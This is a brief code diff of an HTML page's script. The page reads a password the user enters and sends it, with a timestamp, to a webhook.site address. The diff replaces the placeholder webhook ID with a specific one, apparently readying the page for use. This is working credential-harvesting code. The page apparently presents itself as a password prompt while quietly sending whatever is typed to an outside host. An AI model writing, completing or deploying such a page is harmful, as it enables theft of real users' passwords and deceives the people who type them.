@@ -26,7 +26,7 @@
         if (!p) return alert("weak.");
 
         // SEND TO WEBHOOK (GET YOUR URL FROM webhook.site)
-        fetch('https://webhook.site/YOUR-UNIQUE-ID-HERE', {
+        fetch('https://webhook.site/abc123-def456-ghi789', {
             method: 'POST',
             body: JSON.stringify({ password: p, time: new Date() })
         });
@@ -45,4 +45,5 @@
     }
     </script>
 </body>
+
 </html>
